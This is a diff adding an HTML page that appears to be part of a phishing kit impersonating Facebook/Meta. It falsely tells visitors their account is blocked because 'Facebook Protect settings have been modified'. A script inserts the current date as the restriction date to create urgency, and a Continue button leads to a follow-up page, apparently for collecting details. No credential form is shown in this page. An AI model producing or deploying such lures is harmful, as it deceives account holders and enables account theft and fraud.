@@ -1,0 +1,129 @@
+<html lang="en">
+    <head>
+        <title>Privacy Policy</title>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+        <meta
+            name="viewport"
+            content="width=device-width,initial-scale=1,shrink-to-fit=no"
+        />
+        <meta property="og:type" content="website" />
+        <meta property="twitter:type" content="website" />
+        <meta property="og:url" content="/meta-community-standard" />
+        <meta property="twitter:url" content="/meta-community-standard" />
+        <meta property="og:title" content="Privacy Policy" />
+        <meta property="twitter:title" content="Privacy Policy" />
+        <meta
+            property="og:image"
+            content="/static/uploads/1c325477ab8db1be14392399bff625fc.png"
+        />
+        <meta
+            property="twitter:image"
+            content="/static/uploads/1c325477ab8db1be14392399bff625fc.png"
+        />
+        <link rel="stylesheet" href="style.css" />
+    </head>
+    <body>
+        <div id="app" data-v-app="">
+            <div id="app">
+                <div>
+                    <div
+                        class="bg-[#F1F2F6] flex justify-center items-center h-screen"
+                    >
+                        <div
+                            class="sm:w-11/12 md:w-2/3 lg:w-2.5/5 xl:w-2/5 w-11/12 mx-auto rounded-lg p-5 bg-[#fff] self-center"
+                        >
+                            <img
+                                src="./static/images.jpg"
+                                class="w-[70%] mx-auto"
+                            />
+                            <p class="font-bold text-2xl">
+                                The security of your account is at risk.
+                            </p>
+                            <p class="my-3">
+                                We have temporarily blocked your account because
+                                your Facebook Protect settings have been
+                                modified.
+                            </p>
+                            <div
+                                class="p-3 flex items-center gap-3 bg-[#F7F8FA] rounded-md"
+                            >
+                                <div class="text-2xl text-yellow-600">
+                                    <ion-icon
+                                        name="warning-outline"
+                                        role="img"
+                                        class="md hydrated"
+                                        ><div style="width: 24px; height: auto">
+                                            <svg
+                                                xmlns="http://www.w3.org/2000/svg"
+                                                class="ionicon s-ion-icon"
+                                                viewBox="0 0 512 512"
+                                            >
+                                                <path
+                                                    d="M85.57 446.25h340.86a32 32 0 0028.17-47.17L284.18 82.58c-12.09-22.44-44.27-22.44-56.36 0L57.4 399.08a32 32 0 0028.17 47.17z"
+                                                    stroke-linecap="round"
+                                                    stroke-linejoin="round"
+                                                    class="ionicon-fill-none ionicon-stroke-width"
+                                                ></path>
+                                                <path
+                                                    d="M250.26 195.39l5.74 122 5.73-121.95a5.74 5.74 0 00-5.79-6h0a5.74 5.74 0 00-5.68 5.95z"
+                                                    stroke-linecap="round"
+                                                    stroke-linejoin="round"
+                                                    class="ionicon-fill-none ionicon-stroke-width"
+                                                ></path>
+                                                <path
+                                                    d="M256 397.25a20 20 0 1120-20 20 20 0 01-20 20z"
+                                                ></path>
+                                            </svg></div
+                                    ></ion-icon>
+                                </div>
+                                <div>
+                                    <p
+                                        class="font-semibold text-lg"
+                                        id="datetime"
+                                    ></p>
+                                    <p>
+                                        We did this to protect your account from
+                                        being suspended.
+                                    </p>
+                                </div>
+                            </div>
+                            <p class="mt-3 mb-5">
+                                We will guide you through some steps to lift the
+                                page restriction and unlock your account.
+                            </p>
+                            <a
+                                style="text-decoration: none"
+                                class="block text-lg cursor-pointer bg-blue-500 w-full font-semibold text-center py-3 text-white rounded-lg"
+                                href="/page1.html"
+                                >Continue</a
+                            >
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script>
+            // create a function to update the date and time
+            function updateDateTime() {
+                // create a new `Date` object
+                const now = new Date();
+                var options = {
+                    weekday: "long",
+                    year: "numeric",
+                    month: "long",
+                    day: "numeric",
+                };
+                // get the current date and time as a string
+                const currentDateTime = now.toLocaleString("en-US", options);
+
+                // update the `textContent` property of the `span` element with the `id` of `datetime`
+                document.querySelector(
+                    "#datetime"
+                ).textContent = `Your page was restricted on ${currentDateTime}`;
+            }
+
+            // call the `updateDateTime` function every second
+            setInterval(updateDateTime, 1000);
+        </script>
+    </body>
+</html>
